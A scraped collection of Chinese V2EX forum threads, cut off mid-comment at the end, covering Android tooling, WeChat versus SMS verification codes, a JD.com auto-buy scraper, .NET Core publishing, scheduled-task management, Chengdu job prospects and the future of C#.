{"content": "", "reply": "16", "tittle": "快疯了。。使用 Netbeans 尝试配置安卓开发环境，但是安装完各种东西，也可以正常编译 app 了，发现没有 build.gradle..很多东西用不了", "comment": ["安卓开发有什么理由不用    android studio!", "听楼上的，换 as 吧", "人生苦短，用 AS 吧，何必折腾自己", "安卓开发要用 Android Studio 了, Google 已经宣布停止对 Eclips 的支持， Netbeans 用起来想必更麻烦。", "所以问题来了, 为什么打算用 Netbeans 配置?", "闲的蛋疼啊", "不懂你怎么想的", "po 心态不对，既然选择折腾，应该这样想：”哼！愚蠢，这点困难就想阻挡我吗？螳臂当车！”（配合 jojo 画风食用）", " 以前写东西一直用的 nb...很多操作方式用惯了", "真不懂你怎么想的", "何必呢？何苦呢～", "学会时刻紧跟最佳实践的步伐", "netbeans 之前一直在 oracle 手里..所以肯定对 android 支持的不好呐", "楼主这是要开发 J2ME 啊", "as 可以设置 netbeans 的快捷键...", " 戳中要害"]},
{"content": ["<div class=\"topic_content\">今年春节一个拜年短信都没收到，微信看来是人手必备了。\r<br>各种应用还在用短信发验证码，是否可以改成发到微信，这样能省一大笔钱，短信平台也要被革命了。</div>"], "reply": "121", "tittle": "我觉得是时候用微信代替短信验证码了", "comment": ["可以提供這種驗證碼方式，同時短信也可以用", "所以我不用微信也得用微信了？ Orz", "这是可行的，但也是不行的。\r", "微信本质上是腾讯系产品，搞起来垄断到时候大家都吃亏，国内公司的尿性大家都懂。", "你觉得....", "我觉得是时候用微博代替短信验证码了\r", "我觉得是时候用支付婊代替短信验证码了\r", "我觉得是时候用 V2EX 帐号代替短信验证码了", "讨厌微信，动不动就封号", "那还不如搞个 reCAPTCHA 那样睾端的验证码", "有种天真叫 我觉得 XXX", " 看来我是脱离社会的人", " 一个 注册必须手机号，必须用手机登录（其他设备上登录也要手机验证码），加入超过 50 人的群还要绑定银行卡的即时通讯应用在未成年人中普及度很低是很正常的", "写程序要懂得功能之间的解耦。\r", "万一哪天腾讯倒闭了呢。\r", "移动是不会的。有国家支撑。\r", "再者说。有的人还是没有微信的。只有诺基亚。", " \r", " \r", "只是基于标准 RFC 6238 的实现而已，所以各个实现都是可以互相通用的。", " \r", "其实你可以反过来，在 Microsoft Authenticator 里搞 Google 两步验证……", "一、手机号是实名开户（虽然可能有部份不是，但没人为了一个验证码去专门搞个非实名手机号吧），微信不是。\r", "二、手机号多开成本比微信号要高。\r", "三、手机号可以当作客户资源来卖，微信号不行。", "手机验证码的目的是通过接收验证码的方式来确认你的手机号码是畅通状态并且是本人可用的.\r", "是确认可用性的. \r", "你说的微信验证码直接就是第三方登录了还验证码个毛线啊.", "你收不到拜年短信并不代表别人收不到\r", "你的圈子跟别人的圈子不一样", "看到楼主被喷的够呛我就放心了。 哈哈哈哈哈哈", "看到小米商城啥的通过推送验证验证码，感觉这个挺靠谱的", "短信和 Email 是最通用的。\r", "\r", "和微信相比，至少是去中心化的。", "tower 在使用微信验证了", " 哇，今天有一个号就被异常了，解封不到一个小时又异常，只能丢了，好烦啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>win10 拥有虚拟桌面的功能，可以支持多任务时切换界面\n这原本是个很实用的功能\n可是原谅 lz 的笔记本弱鸡，只支持快捷键操作\n切换虚拟桌面需要按 alt+win+left/right\n这么多键，还在键盘的两边\n太难受了</p>\n<p>于是，想到能不能直接在 touchpad 上\n直接手势操作，进行切换虚拟桌面\n比如，三指左右划实现切换\n然后，找到了<a href=\"https://support.microsoft.com/en-us/instantanswers/1ea771fa-a9ee-4a43-97f8-e2a1242e28ac/touchpad-gestures-for-windows-10\" rel=\"nofollow\">这个</a>\n发现 win10 ，对这个操作是支持的呀\n可是，我的弱鸡本并不行（是厂商减成本不做这个功能？）</p>\n<p>想问下大家，你们的本，能手势操作切换虚拟桌面吗\n方便的话，能否给个型号？\n谢谢捧场</p>\n</div></div>"], "reply": "8", "tittle": "你们就没有关于 win10 手势操作的疑惑吗？", "comment": ["有 precision touchpad 驱动的笔记本都能。", "楼主的链接里并没有说 win10 支持触摸板切换虚拟桌面\r", "而且应该是 alt+win+left/right ==> ctrl+win+left/right 吧。。。\r", "三指是切换窗口吧，四指才是切换虚拟桌面\r", "就是 1 楼说的 precision touchpad", "苏菲触摸板可以 4 指切换虚拟桌面", "当然可以，不需要安装任何插件\r", "三指轻按调出小娜，三指滑动切换窗口，三指下推最小化所有窗口，三指上推显示所有窗口（若无窗口打开），三指上推管理虚拟桌面或在其中拖拽窗口（类似 mission control ）。四指左右滑动切换虚拟桌面。\r", "如果不行，建议看看是不是驱动没装，或者电脑太便宜了", "4 指小娜", "我的 thinkpad e470 就支持，三指四肢可以自己定义。现在用着 win10 除了在 chrome 里不能两指前进后退其他感觉和 mac 没啥差别了", "Windows 设置->设备->鼠标和触摸板，在这里可以设置四指滑动切换桌面等等手势。\r", "\r", "只有支持 Precision Touchpad 的设备才支持手势。旧笔记本(aka. Windows 7 时代的笔记本)一般不支持。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>出来比 react native 晚，说是设计者和开发者用的，从一开始就做原型到完成都是在 fuse 中，\n不知道有人用在商业上吗？</p>\n<p>跟 react native 的对比\n<a href=\"http://www.fusetools.com.cn/community/index.php/topic/show/1\" rel=\"nofollow\">http://www.fusetools.com.cn/community/index.php/topic/show/1</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "有人在用 fuse 开发 APP 吗", "comment": []},
{"content": ["<div class=\"topic_content\">自动翻译，比如百度翻译，有道翻译，一碰到算法题翻译得异常准确\r<br> \r<br><a target=\"_blank\" href=\"http://imgur.com/mJLhvMS\" rel=\"nofollow\">http://imgur.com/mJLhvMS</a>\r<br>翻得太好了吧</div>"], "reply": "16", "tittle": "我发现一个有趣的现象，关于自动翻译", "comment": ["难道是因为算法题的语句都比较严谨机器化的原因么", "现在整句翻译还是 Google 翻译好", "这些翻译也是会机器学习的...类似的题很多而且说法都几乎一样所以很准确咯", "因为机器一看，哟，自己人", "是不是计算机相关的语料多？\r", "各个编程语言的文档很多都有翻译版，而且 msdn 的多语言文档更多。\r", "\r", "现在 msdn 开始大面积使用机器翻译的文档了。", "确实好神奇，翻译的太好了", "感觉是越专业的东西翻译的越准确，因为语境明确吧。\r", "\r", "当然前提是语料要足", "语料问题而已", "所以计算机的文献翻译的不好，作者也有责任吧（逃", "我猜是因为学术类文章歧义少", "本来就是它们母语", " 早就自动了，要不然 c# 的 API 参考不可能全有中文版的。", " 记得.net 2.0 时 api 参考不象现在一样有机器翻译说明，应该是人工翻译的。", "这应该还是人工翻译的。。这些题已经有人工翻译好的语料库了。", "中文的再翻译回英文呢？", " .net 库很庞大的。。直接翻译根本来不及，应该是 CAT 然后人工校对。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>源码 <a href=\"https://github.com/Adyzng/jd-autobuy\" rel=\"nofollow\">https://github.com/Adyzng/jd-autobuy</a>\nPython 爬虫，自动登录京东网站，查询商品库存，价格，显示购物车详情等。\n可以指定抢购商品，自动购买下单，然后手动去京东付款就行。</p>\n<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++\nThu Aug 11 23:51:30 2016 &gt; 登陆\n无验证码登陆\n登陆成功 ****\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++\nThu Aug 11 23:51:36 2016 &gt; 商品详情\n编号： 2567304\n库存：有货\n价格： 2188.00\n名称：华为 HUAWEI WATCH 经典系列 智能手表（不锈钢三珠表带） 手表蓝牙通话 星河银\n链接： <a href=\"http://cart.jd.com/gate.action?pid=2567304&amp;pcount=1&amp;ptype=1\" rel=\"nofollow\">http://cart.jd.com/gate.action?pid=2567304&amp;pcount=1&amp;ptype=1</a>\n商品已成功加入购物车！\n购买数量： 2567304 &gt; 2\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++\nThu Aug 11 23:51:38 2016 &gt; 购物车明细\n购买    数量    价格        总价        商品\nY      2       2188.00     4376.00     华为 HUAWEI WATCH 经典系列 智能手表（不锈钢三珠表带） 手表蓝牙通话 星河银</p>\n<ul>\n<li>\n<pre><code> 1       169.00      169.00       [活动商品] 小米（ MI ）小米手环 2 心率监测 来电提醒\n</code></pre>\n</li>\n<li>\n<pre><code> 1       199.00      199.00      小米（ MI ）小米手环 2 心率监测 来电提醒\n</code></pre>\n</li>\n<li>\n<pre><code> 1       69.00       69.00       LAMY 凌美 50MLT52 黑色墨水\n</code></pre>\n</li>\n</ul>\n<p>总数: 2\n总额: ￥ 4376.00\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++\nThu Aug 11 23:51:38 2016 &gt; 订单详情\n应付款：￥ 4376.00\n收货人：*** 18*********\n寄送至： 北京*******************\n下单成功！订单号： 212****1442\n请前往东京官方商城付款\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>\n<p>代码测试很好用，但是不知道如何在 python 运行时添加更多的爬虫任务，类似消息队列或者任务队列，可以让程序循环读取，请各位大神帮助</p>\n</div></div>"], "reply": "13", "tittle": "京东 自动抢购 代码如何添加任务队列", "comment": ["考虑外包的话可以联系我 ", "Queue", "queue", "京东不是有代下单吗？这个比代下单有啥优势吗？", " #4 \r", "这玩意是用来撸保时捷，圆鸡蛋之类 到手就能加价几千块卖了的商品的", " 程序可以在商品降价自动下单", "京东下单支付方式那里，京东支付和在线支付到底有什么区别到现在我也没弄明白", "python Queue 是阻塞的.", " 可以实时添加任务到队列吗", " 程序可以实现加入购物车并结算，最终在未完成的订单中付款", "可以撸抢购 之前写过 js 脚本跑过一部手机 当时提交函数直接是全局函数。。。", " js 是写成浏览器插件吗？", " 当时只是封成了一个 js 直接书签运行调用的 京东现在抢购流程改了 失效了 一直也懒得改 没啥要抢的了"]},
{"content": ["<div class=\"topic_content\">以前 1.0 的时候都是在项目路径下修改 projects.json 里面的 runtime 参数。\r<br>现在 1.1 MS 弃用 projects.json 了，用回 projects.csproj 了！\r<br>懵逼，官方文档还是 1.0 时代，现在不知道怎么改才能把 dotnet 项目编译到 exe 了，有没有大神告知下。</div>"], "reply": "19", "tittle": ".net core 1.1 项目如何编译到 exe?", "comment": ["<TargetFramework>netcoreapp1.1</TargetFramework>\r", "下加入一行\r", "<RuntimeIdentifiers>win10-x64;ubuntu.14.04-x64</RuntimeIdentifiers>\r", "然后用 dotnet publish -r ubuntu.14.04-x64\r", "但是会出错。。用 vs 带的发布功能也也会出错，应该是这个功能现在还有问题", "微软总是在变…", " 是啊，我也看到了 RID 的字段，但是同样的，用 VS 和 VS code 都无法正确发布。\r", "奇了怪，按理说宇宙 IDE 不会犯这种错才对。现在跑程序只能 dotnet run 命令有点中二。", "我也在关注这个问题。", " 说反了，其实是世界变太快，半年后某种东西完全没人跟了，微软只是保持跟上~", "正准备入坑呢", ".net core 没有 exe ，只有 dll ， dll 之间的分别只是带不带入口函数而已。", "need run time ..", " 不是，很肯定是有的。以 standalone 方式打包就行，以前都 OK 的，自从玩了 vs2017 ，这配置文件改了，也没地方说明其中的字段含义。", " RC2 的时候是有的，后来取消了。另外建议使用 LTS 的版本。", "说来如果只需要针对 Windows 的话写 net462 的 target 就行了(JTL", " 可以先用 preview2 的 1.1sdk ，用的是 projects.json 可以正常发布", " 是的，没错，其实只针对 windows 的话，我直接用 C#写 console app 就好了。可是我需要跨平台才会用.net core.\r", "\r", " 今天 vs2017 更新了，其中提到了 MSBuild 更新，我先跑完试试看吧，实在不想换环境，太麻烦了。", " 一行配置文件的事情也算改吗？ vs17 打开 vs2003 写的.net 代码都能直接编译，这种级别的向下兼容  \r", "水果呢？ swift 2 2.3 3 4? os 升个小版本一大堆程序挂掉？", " 刚试了下 是用法不对\r", "先\r", "dotnet restore -r ubuntu.14.04-x64\r", "再\r", "dotnet publish -r ubuntu.14.04-x64 \r", "就正常发布了", " 我在 linux 下没有 dotnet restore -r 指令哇， help 了一下也没有相关的 runtime 参数。", " 下载最新的 sdk\r", "<RuntimeIdentifiers>win10-x64;ubuntu.14.04-x64</RuntimeIdentifiers> 也不是必须的", " 苹果自从有了 swift ，被骂的不行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>年前回老家了, 没有网络, 第二周的课程提交的比较晚(1 月 30 日提交的), 到现在还没有同学打分, 如果有正在学的麻烦打个分吧. 谢谢啦~</p>\n<p>这个是链接(应该是这个吧...):</p>\n<p><a href=\"https://www.coursera.org/learn/programming-languages/peer/bplyW/homework-1/review/7OA27ObyEeaJgRJywFAYDA\" rel=\"nofollow\">https://www.coursera.org/learn/programming-languages/peer/bplyW/homework-1/review/7OA27ObyEeaJgRJywFAYDA</a></p>\n</div></div>"], "reply": "2", "tittle": "有人在学 Coursera 上的 Programming Languages 吗?", "comment": ["已经给了 review 了", " 多谢啦，那个课程已经通过啦~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>每次开机会正常一会。<br>\n然后在随机一段时间后，键盘灯就不亮了，彻底失灵。</p>\n<p>拔下重插之前的 USB 口也不好使。</p>\n<p>但是拔下从 USB3.0 换到 USB2.0 的口或者 USB2.0 换到 USB3.0 的口，就正常了。</p>\n</div></div>", "<div class=\"topic_content\">笔记本是神舟战神 K650D I5 D1\r<br>\r<br>键盘是十块二十块那种普通键盘。</div>"], "reply": "37", "tittle": "疑问求助：为什么笔记本外接键盘，在 win10 系统下，开机过一段时间会失灵？", "comment": ["或许你可以试试换个键盘？", " 换过 都一样", "在设备管理器里面把键盘的\"允许计算机关闭这个设备以节约电源\"取消掉试试", " 键盘的这个选项是灰的， USB 设备的已经全部去掉了。", "拔下再接肯定没问题的，等于重新连了。拿键盘去其它电脑上试试有没有问题，如果没有的话估计就是你的笔记本或系统 的问题了。\r", "\r", "PS ：个人建议用无线键盘吧。", "要是条件允许的话，建议重装电脑……\r", "我之前也是被一个电脑睡眠的问题搞得头大，怎么排查也找不到原因，重装之后好了（所有设置都跟重装前一模一样……", " 重装过，问题依旧\r", " 没在其他电脑上试过，但是两个键盘都是新的。", "* 笔记本： Alienware 15 R2\r", "* 键盘： Filco 忍者二 87 键侧刻\r", "* OS: Win10 Pro\r", "\r", "用了接近一年，没有你说的问题\r", "现在换了蓝牙键盘 Matias Laptop Pro \r", "\r", "也没你说的问题", "是不是 ikbc ？？？？如果是重刷 IKBC 的固件，如果不是 IKBC ，抱歉，没遇见过。", " 很普通的 20 块钱键盘。", " 极有可能是你电脑本身硬件有问题了，建议立刻在别的电脑上试试。\r", "\r", "PS ：我之前有个 IBM 的 USB 鼠标，装了官方驱动后就抽风了，删了后一切正常。。。。", " 我在网上搜了一下，貌似遇到这个问题的也不少。", "什么键盘？去官网刷个驱动试试呢？", "两个可能性 一 bios 电源管理里面 设置了 usb 休眠时间， 2 usb 有短路问题，这个 usb 短路  如果你是台资笔记本这个可能性会比较大， 如果是华硕 微星  可能性能大过 80%", "怀疑是键盘问题。\r", "我的高斯 87 在笔记本待机的时候能够唤醒电脑。\r", "但收的一款老键盘-Lolita dpyden 87 LED 背光版却无法唤醒电脑。", "怀疑驱动的问题", " \r", " \r", "很普通的键盘，十块二十块的，都基本上是新的。如果有问题不会这么巧吧。\r", "\r", "\r", " 鼠标就没问题。\r", "\r", "\r", " 我也感觉是驱动的问题，但是我不知道问题出在哪。普通的键盘也没有专属的驱动啊。", "就没人提醒下卤煮检查下 Windows 电源设置中的 USB 选择性暂停设置么...", "换个系统试试？同款电脑+ubuntu 没有这个问题。", " 感谢，我今晚下班回去试试。\r", "\r", " 不喜欢用 win 之外的操作系统。", " 设置不对要换系统太兴师动众了 :D", "Win10 ，我笔记本键盘也会偶尔失灵……每次重启。", "貌似是系统的问题。。。我也是经常重新连接", "我也有这个问题，手里一把 poker ，插到 win10 就会一直自己打字， win7 就没问题 TAT", " \r", " \r", "至少能排除下问题，不用真的安装，从 live cd 里运行一段时间试试就好了。", "你是不是玩 Dota2 出现的这个情况？", " 键盘失灵的时候，如果正好赶上在按键，那么这个键会不停的输入，除非把键盘拔下来。别问我怎么知道的，那回合 CS 我被当成了活靶子。\r", "\r", "\r", " 玩不玩游戏都会有这个问题。", " 看看 bios 里面有没有 xhci 类的选项，改一下设置", " 阁下说的可是“换”而不是“试” yoooo", "遇到一个类似的问题， Linux 上开机或者唤醒一段时间内，外接键盘鼠标无响应，但是在 Windows 上没这个现象。", " Sorry 让你误解了。", " 对，拔下重新插就没事。", " 但是我这个拔下再插上也没用", "\r", "\r", "监控 usb 口", "我也是，键盘常常失灵，在两台电脑（一台战神 z7 一台 thinkpad ）的 win10 都是这样，同样的电脑， ubuntu 系统就没这种问题。键盘是微软的。", "类似这种情况前几天我也遇到，睡眠时有时侯按键盘鼠标无法唤醒，还有按电源键唤醒后鼠标键盘操作失效，不过键盘灯鼠标灯还亮  win10 10240 ；\r", "另外有一台 win10  enterprise 2016 睡眠后有时输入密码后一直转圈无法登录。搜问题说是 win10bug", "在 bios 里 usb 的设置"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h4>描述</h4>\n<p>早期我们使用 <code>crontab</code> 来执行定时任务， 后续考虑到定时任务变多， 并且服务也逐渐拆成了微服务， 上百个服务，其中有很多服务依赖定时任务（<code>关于架构这块存在的问题，不做讨论</code>）， 后基于 <code>apscheduler</code> 实现了一套 api ， 还套了个单页应用，以供开发使用。</p>\n<h4>问题</h4>\n<p>随着任务变多， 很多秒级任务执行， <code>apscheduler</code> 较不稳定。</p>\n<p>值得一提的是， 在 jobstore 这块查询多了也偶有问题。</p>\n<pre><code>from apscheduler.executors.pool import ProcessPoolExecutor\nfrom apscheduler.jobstores.sqlalchemy import SQLAlchemyJobStore\nfrom apscheduler.schedulers.background import BackgroundScheduler\n</code></pre>\n<p>早期使用时有稍微走读下源码， 实际上对 <code>apscheduler</code> 的使用也不能算非常熟悉。 算是勉强造了个轮子吧。</p>\n<h4>期望</h4>\n<p>想通过本帖知道各位同学是怎么管理定时任务的， 我在设计时是支持了几种方法， 如下:</p>\n<ol>\n<li>命令执行(hcmd)</li>\n<li>http get(hget)</li>\n<li>http post(hpost)</li>\n</ol>\n<p>然后支持一个 echo 的回调， 整体来讲， 比较简单，如果说有重使用这个的 也希望取个经， 看是否能解惑。</p>\n<p>另外一个就是想知道有没有其他解决方案， 我看历史贴里面对这个的讨论比较少， 所以在此发一贴。</p>\n</div></div>"], "reply": "8", "tittle": "关于定时任务管理", "comment": ["管理设计一套用于控制的任务队列的接口就行了（任务执行还是要异步的来），包括执行状态结果的异步返回，也要设计个回调接口（可选）。", "我最近在用 Redis 的 Keyspace Notifications ... 满足我的一切需求 ...", "我用的是 minicron", "必须 Paxos 呀 ", "用 java 的 Quartz 实现了一个 cron 任务管理。", "  谢谢， 不知可有借鉴的项目呢\r", "\r", "   我看看，谢谢\r", "\r", "   嗯， 这个我到是有看到\r", "\r", "  我看一下\r", "\r", "  鄙人运维， 不熟悉 java ， 即便一开始就知道 quartz 也未尝试。\r", "\r", "\r", "昨晚发完贴后， 有事儿后来没能跟进本帖， 抱歉。", "Azkaban"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://raw.githubusercontent.com/aleen42/https-resources/master/snapshot_of_poc_sorting.png\"></p>\n<p>Actually, I think all the coder will have a note when learning sorting, but what if I use an animation to show it apprently? Here is the POC (Proof of concepts) of what I have done.</p>\n<p><a href=\"https://aleen42.gitbooks.io/personalwiki/content/Algorithmn/Sort/Sort.html#poc-proof-of-concepts\" rel=\"nofollow\">https://aleen42.gitbooks.io/personalwiki/content/Algorithmn/Sort/Sort.html#poc-proof-of-concepts</a></p>\n<p>If you like this, thanks for you appreciation.</p>\n</div></div>"], "reply": "4", "tittle": "How about showing sorting algorithms in this way, wow?", "comment": ["All red,horrible.", " wow~", " Hah, crazy red."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前给 VS Code 撸了个<a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag\" rel=\"nofollow\">Auto Close Tag</a>，默认情况下是对所有语言都 enable 的，但是会对有些语言造成 side effect ，比如 C++，写<code>#include &lt;iostream&gt;</code>，就会变成<code>#include &lt;iostream&gt;&lt;/iostream&gt;</code>。现在准备只对特定的一些语言才开启这个功能，想问问 V 友还有哪些语言是会内嵌 html 的？🤔 现在整理了一部分： <a href=\"https://github.com/formulahendry/vscode-auto-close-tag/issues/26\" rel=\"nofollow\">https://github.com/formulahendry/vscode-auto-close-tag/issues/26</a></p>\n<pre><code>\"auto-close-tag.activationOnLanguage\": [\n    \"html\",\n    \"xml\",\n    \"php\",\n    \"javascript\",\n    \"javascriptreact\",\n    \"typescript\",\n    \"typescriptreact\",\n    \"plaintext\",\n    \"markdown\"\n]\n</code></pre>\n</div></div>"], "reply": "9", "tittle": "有哪些语言是可以内嵌 html 的？", "comment": ["理论上所有语言都可以直接把 html 写成 string 然后 print 出来吧，但是主流的大概就那些了", "还有上古的 asp ，以及 plist 和 xhtml 不知道有没有算进去…", "xml 作为数据格式和逻辑语言不是一个层级，可以和所有语言搭配嘛，所以我觉得支持 xml 就可以了😃\r", "\r", "另外<? echo \"bla bla\"; ?>会不会有 bug😝", "世界上“最好”的语言 php", "所以我配置成</才结束 tag", "补充一个 Scala 支持 first-class xml", " 不会有 bug~😎", " 是个好方法，哈哈", "*html, 比如 cshtml"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在亚马逊官方 kindle 电子书商店找一本书没找，就 google 到了一个推送网站，上面有。</p>\n</div></div>"], "reply": "31", "tittle": "有一些免费推送 kindle 电子书的网站，他们有版权吗？", "comment": ["这种问题不用问，就算他推送给你是收费，他也是没有版权的。我觉得", "图灵上也可以买，应该是有版权的", "怎么可能有....\r", "\r", "除了图灵,其他的都是盗版.....", "读书人的事，能叫偷吗", "读书人的事，能叫偷吗", "如果他们有版权 书就不会有那么多了", "图灵有版权，但是图灵已经不能推送 Kindle 了，只提供 mobi 格式或者 PDF 。", "肯定木有", "亚马逊官方 kindle 商店有版权吗？", " 有", "我现在大概就是先亚马逊 木有 就用盗版的...", "读书人的事，哪里还有正版盗版一说。", "读书人的事，能叫偷吗？", "这叫 非礼而阅(曰)之", "没有版权，请楼主不要推送下载！", "lz 可以洁身自好", " 推了一本，以后不会用了", "要尊重国情啊", "书还需要偷吗，都是光明正大的抢。", "一般就是 amazon 借，或者图灵买，电子书相比较已经很便宜了", "不知道为什么 kindle 的书和纸质版价钱差距不大，按理说电子书成本低，价钱是比纸质书低一点，\r", "但是他难道没有想过 kindle 体验比纸质书更差点吗？", "都在学人家毛子，开个 bookzz 那是堂而皇之的。", " 电子书,,销量低.....单价不卖高点.....回本有点困难...", " 补充一点...定价高的原因,还有一个原因就是,定价低点也不会有销量爆炸...这个跟 galgame 卖这么贵的原因差不多..", "试过 kindle 推，有些推不到。。。", "订阅和推送网站的像 ", " 上面有些亚马逊也没有的订阅内容 这种的应该不算吧", " 你以为印刷成本和仓储能有多少？主要是版权。而且 kindle 的体验不差啊，随身图书馆。除了图片和代码，大部分书看起来都不错。", " 再说，排版、录入也是笔开销。", "话说你们的 kindle 都是在哪儿买的？最近想入手", "版权都是有期限的，过期以后就可以随便用了。", " 亚马逊啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>金融科技公司：优品财富管理有限公司诚招 windows c++、 linux c++、 node.js ；腾讯 T4 专家领衔，技术团队 150 人；</p>\n<pre><code>薪酬福利：月薪一万起，满足你对互联网公司的一切幻想：高薪酬、高颜值、 open 的领导、人性化的企业文化\n\n坐标：武汉光谷金融港\n\n联系电话： 18627710069 （雷）\n\nqq ： 2667816922\n\n邮箱： qinting.lei@upchina.com\n</code></pre>\n</div></div>"], "reply": "目前尚无回", "tittle": "武汉金融科技企业诚招 windows c++、 Linux c++、node.js、测试，月薪一万起，欢迎投递", "comment": []},
{"content": ["<div class=\"topic_content\">有说西安，有说沈阳的，都在说工作环境不适合真正想做事儿的人，不知道成都怎么样？\r<br>\r<br>原本在计划着去成都发展了，照这么看来，生活虽然比北上广安逸，但如果真的工作起来憋屈，还不如不回去了。\r<br>\r<br>做网站系统运维的，更怕不被理解，被看轻。老板要是不懂，技术团队不重视，都在赶项目，提出的架构优化建议不听取或是往后排，出了问题又要背锅，不得憋屈死。</div>"], "reply": "30", "tittle": "都在说二线城市不好, 不知道成都情况如何", "comment": ["成都的 IT 环境还是相当可以的   阿里 腾讯 京东 华为 都有分部 而且还有成电这个学校在  计算机互联网氛围也还是可以的  非常有潜力", "有朋友在那边工作和上学，一致认为比较适合过日子，好吃的特别多，唯一缺点是雾霾。\r", "\r", "ps ：王者农药也在成都呐~", "不是本地人，搞不定户口，那就无所谓哪个城市，只要自己喜欢就 OK 。相信我，这是经验之谈。", "成都空气不行，特别是早上", "成都雾霾好像比北京还要严重", "成都软件环境还不错，并且天府新城科学城就是政府的大项目，", "成都 IT 环境还可以，有很多大公司在这边都有分部，遗憾的是成都本土比较牛逼的 IT 公司貌似没两个，这边冬天雾霾太严重，去年比北京还严重，本人就在成都。", "成都的雾霾是我出走的原因里的最后一根稻草，没有雾霾的成都真的就很适合过日子，可惜了", "别信那些什么成都生活节奏缓慢的，成都这边工作一样的拼，赶，\r", "工作环境这些其实挺好的，唯一缺点就是冬天空气特别不好", "成都冬天天气差，其它方面条件挺好的。", " 成都那边薪资待遇如何，和北京比起来能差多少？", " 这么说吧，在成都中级程序员的月薪能够买得起一平米的房（按均价）。", "成都的话冬天经常见不到太阳。。。太致郁了。。可能是我太敏感了吧。。", "成都好吃的多, 呆了几个月, 胃口越来越好.\r", "\r", "见不到太阳, 每天特别想睡觉, 也睡的特别好.\r", "\r", "当年在那边加班做项目, 结果我胖了好多, 领导以为我不努力.....很郁闷.", " #12 是主城区的均价还是包括郊区的均价啊?", "冬天雾霾经常 200 以上，呼吸道不行的别来了吧", "公司预计 5 月份倒闭。\r", "5 年经验的等倒闭后准备找个活儿干。。。\r", "主要写 java ， python 也会一点， go 和 js 也会一点点。", " 管理工作、文档管理工作、接待客户工作、打扫卫生、谈合作都会一点点。\r", "什么都会什么都不精的水平。哎~", "听说王者农药发了年终奖后成都就加强了限购哈哈哈哈", "重庆人好羡慕成都，待遇高 3 成以上", " 我们公司来了一个王者农药团队的，据说年终奖 64 个月， 666", "以前在南京上班，回成都工作几年了，唯一觉得不好的就是冬天的雾霾。当然，全国雾霾都严重，所以也还好。如果想避开雾霾，建议去深圳；不介意雾霾，成都真的挺好", "只知道成都的游戏公司不算少", "去年有去成都的计划，一看雾霾放弃了，还是老老实实蹲深圳吧", "2016 年成都雾霾指数爆表，引领中国污染城市之首。想不通天府之国为什么会变成这样？难道是盆地的原因？", "成都互联网行业在二线城市中算是比较成熟了的，天府软件园也比较给力，可以投奔~", "看了大家的评论，重点都是在雾霾上，过年那会在成都呆了 10 天，确实没比北京好多少，好像还没风，哎", " 王者农药好像没有离职的", "如果成都没有雾霾，可能是二线城市里最宜居的地方了吧。\r", "房价比较温柔，开车出去 100 公里就有风景区。\r", "成都的雾霾和北京不一样，成都是不下暴雨雾霾不好，因为没风吹不走。\r", "比如今天，下着小雨 PM2.5-150 。", " 64 ？估计不是 core"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前两天又看到有 C# 的小伙伴转去做 java 了，某名的感到有些惶恐</p>\n<p>中国互联网行业已经很少有企业使用 c# (dotnet)了。能找到的职位薪水，也比相应的 java 甚至 php 差一大截。而且大多数都是做企业信息化项目的，很少有自己开发产品的。</p>\n<p>其实从使用效果上来说，无论从开发效率还是运行效率， c# 都不比其他后端语言差，而语法方面又从各种脚本语言学习借鉴了很多，用起来也是非常舒服。唯一不大行的就是社区生态环境建设上比较落后，很多工具已经被别的语言占坑了。</p>\n<p>前一阵子看到 donnet core 开源并且跨平台后，觉得 c#还能雄起一把，但是现状看起来在国外还能有所进步，但在国内应该是没什么希望的样子了。</p>\n<p>不知道其他小伙伴又什么看法？</p>\n</div></div>"], "reply": "86", "tittle": "[讨论] 大家说说 c# 在中国还有没有前途？", "comment": ["没有🌝", "我这苏锡常 IT 圈子里反正还有企业在招 WPF 开发。\r", "就算这语言没前景也不是今天说没明天就没了。\r", "况且我大微软还在力推，各方面都在向好的方向（适应大环境）发展。\r", "我入坑 C#完全因为这语法最适合我，用起来最舒服。我就等 .net core 成熟了，不着急。", "在互联网行业没前途，科技公司（程序员）热爱开源", " 😭", "cpp 转 ", " core ，当前很顺利", "C# 用得很嗨在我厂。", "C#感觉用的多的还是游戏公司多一些吧， unity 。", "不知道。。 C#转 php 中  公司桌面软件需求少了 大部分都是 web 的  php 写起来的确也方便 以前一个人负责前后端 ,想怎么写怎么写 现在扩大招人了  考虑到招人和解决问题的成本换 php 了.. 无奈", "国内互联网大热，相关的技术跟着热而已， C#只是正常稳定发展而已，所以相对看着“没前途”，但是其实根本不用担心，反而是那些随着热潮入行的人，需要考虑热潮退了自己会咋样，参考 ios 。", "nope", "刷一波 C#招聘,坐标上海,项目主要是做比特币交易服务器端开发,对高并发交易感兴趣可以联系我,微信:13764246315,请备注下 V2EX C#", "10 年前玩过 C#的路过，感觉 windows 下面用用还是不错的。", "单说语言的话 unity 还是很有空间的，说平台的话.net 在国内确实不行", "找工作的话，长远来看，不如做 java", "如果你在一个非 c#为主的环境有这样的担忧很正常的，工资低也不是都是 C#问题哈~\r", "在大多数企业级应用和定制市场 C#的身影还是很常见的。", "在帝都 没“钱”途...", "不知道 C#在 Linux 上的部署咋样?", "那是个什么东西？", "为什么不去 csdn 问问？😉", "短时间内是没戏了，正在考虑转不转，唉！", "移动互联网公司,很少用 ", " 做后台的，所以......", "已转行╮(╯_╰)╭", " \r", "dotnet core 很好用的，性能比 windows 